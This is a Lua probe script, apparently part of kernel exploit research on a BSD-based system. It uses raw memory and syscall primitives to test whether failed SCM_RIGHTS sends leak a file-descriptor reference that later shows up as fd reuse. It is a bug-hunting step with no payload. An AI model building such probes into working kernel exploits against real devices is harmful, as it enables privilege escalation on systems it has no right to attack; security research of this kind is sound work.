-- CRASH_CLASS: LOW
-- PROBE 108b-mini: minimal SCM_RIGHTS refcount leak test

print("=== 108b MINI START ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

print("[*] helpers loaded")

-- Create socketpair
local sv = memory.alloc(8)
safe_wd(sv, 0)
safe_wd(sv + 4, 0)
local ok1, ret1 = pcall(function()
    return make_syscall(135)(uint64(1), uint64(1), uint64(0), uint64(sv))
end)
local fd_a = safe_rd(sv)
local fd_b = safe_rd(sv + 4)
print("[*] socketpair: ok=" .. tostring(ok1) .. " ret=" .. tostring(to_num(ret1)) .. " fds=" .. tostring(fd_a) .. "," .. tostring(fd_b))

-- Create target socket
local ok2, tgt = pcall(function()
    return to_num(make_syscall(97)(uint64(1), uint64(1), uint64(0)))
end)
print("[*] target: ok=" .. tostring(ok2) .. " fd=" .. tostring(tgt))

-- Send target fd over socketpair via SCM_RIGHTS
local iov_data = memory.alloc(8)
safe_wd(iov_data, 0x41)
local iov = memory.alloc(16)
safe_wq(iov, uint64(iov_data))
safe_wq(iov + 8, uint64(1))

local cmsg = memory.alloc(32)
for i = 0, 31, 4 do safe_wd(cmsg + i, 0) end
safe_wd(cmsg, 20)          -- cmsg_len = CMSG_HDR(16) + 4
safe_wd(cmsg + 4, 0xFFFF)  -- SOL_SOCKET
safe_wd(cmsg + 8, 1)       -- SCM_RIGHTS
safe_wd(cmsg + 16, tgt)    -- the fd

local msg = memory.alloc(48)
for i = 0, 47, 4 do safe_wd(msg + i, 0) end
safe_wq(msg + 16, uint64(iov))    -- msg_iov
safe_wd(msg + 24, 1)               -- msg_iovlen
safe_wq(msg + 32, uint64(cmsg))   -- msg_control
safe_wd(msg + 40, 24)              -- msg_controllen
-- Note: msg_name=NULL (offset 0), msg_namelen=0 (offset 8), msg_flags=0 (offset 44)

local ok3, sret = pcall(function()
    return make_syscall(28)(uint64(fd_b), uint64(msg), uint64(0))
end)
print("[*] sendmsg: ok=" .. tostring(ok3) .. " ret=" .. tostring(to_num(sret)))

-- Now test: set SO_RCVBUF to minimum
local optbuf = memory.alloc(4)
safe_wd(optbuf, 1)
local ok4, sopt = pcall(function()
    return make_syscall(105)(uint64(fd_a), uint64(0xFFFF), uint64(0x1002), uint64(optbuf), uint64(4))
end)
print("[*] SO_RCVBUF=1: ok=" .. tostring(ok4) .. " ret=" .. tostring(to_num(sopt)))

-- Read back SO_RCVBUF
safe_wd(optbuf, 0)
local olen = memory.alloc(4)
safe_wd(olen, 4)
local ok5, gopt = pcall(function()
    return make_syscall(118)(uint64(fd_a), uint64(0xFFFF), uint64(0x1002), uint64(optbuf), uint64(olen))
end)
local rcvbuf = safe_rd(optbuf)
print("[*] actual rcvbuf=" .. tostring(rcvbuf))

-- Fill the buffer with plain write
local fillbuf = memory.alloc(4096)
for i = 0, 255, 4 do safe_wd(fillbuf + i, 0x42424242) end

-- Set nonblocking on sender
pcall(function()
    local fl = to_num(make_syscall(92)(uint64(fd_b), uint64(3)))
    make_syscall(92)(uint64(fd_b), uint64(4), uint64(fl + 4))
end)

local total = 0
for round = 1, 50 do
    local ok_w, wret = pcall(function()
        return to_num(make_syscall(4)(uint64(fd_b), uint64(fillbuf), uint64(4096)))
    end)
    if not ok_w then break end
    local w = to_num(wret)
    if w <= 0 then break end
    total = total + w
end
print("[*] filled " .. total .. " bytes")

-- Now send SCM_RIGHTS with full buffer (should fail)
local fail_n = 0
local succ_n = 0
for i = 1, 20 do
    -- Rebuild cmsg each time (fresh alloc)
    local cm2 = memory.alloc(32)
    for j = 0, 31, 4 do safe_wd(cm2 + j, 0) end
    safe_wd(cm2, 20)
    safe_wd(cm2 + 4, 0xFFFF)
    safe_wd(cm2 + 8, 1)
    safe_wd(cm2 + 16, tgt)

    local iv2_d = memory.alloc(8)
    safe_wd(iv2_d, 0x41)
    local iv2 = memory.alloc(16)
    safe_wq(iv2, uint64(iv2_d))
    safe_wq(iv2 + 8, uint64(1))

    local m2 = memory.alloc(48)
    for j = 0, 47, 4 do safe_wd(m2 + j, 0) end
    safe_wq(m2 + 16, uint64(iv2))
    safe_wd(m2 + 24, 1)
    safe_wq(m2 + 32, uint64(cm2))
    safe_wd(m2 + 40, 24)

    local ok_s, sr = pcall(function()
        return make_syscall(28)(uint64(fd_b), uint64(m2), uint64(0x80))
    end)
    if not ok_s then
        fail_n = fail_n + 1
    else
        local rv = to_num(sr)
        if rv < 0 then fail_n = fail_n + 1 else succ_n = succ_n + 1 end
    end
    if i <= 5 then
        print("[*] attempt " .. i .. ": ok=" .. tostring(ok_s) .. " ret=" .. tostring(ok_s and to_num(sr) or "pcall-fail"))
    end
end
print("[*] results: " .. succ_n .. " ok, " .. fail_n .. " fail / 20")

-- Close target, check if fd is reused
pcall(function() make_syscall(6)(uint64(tgt)) end)
local new_fds = {}
for i = 1, 5 do
    local ok_n, nfd = pcall(function()
        return to_num(make_syscall(97)(uint64(1), uint64(1), uint64(0)))
    end)
    if ok_n and to_num(nfd) >= 0 then table.insert(new_fds, to_num(nfd)) end
end
print("[*] new fds after close: " .. table.concat(new_fds, ","))

local reused = false
for _, nf in ipairs(new_fds) do if nf == tgt then reused = true end end
print("[*] target fd " .. tostring(tgt) .. " reused=" .. tostring(reused))

-- Cleanup
for _, nf in ipairs(new_fds) do pcall(function() make_syscall(6)(uint64(nf)) end) end
pcall(function() make_syscall(6)(uint64(fd_a)) end)
pcall(function() make_syscall(6)(uint64(fd_b)) end)

print("=== 108b MINI COMPLETE ===")
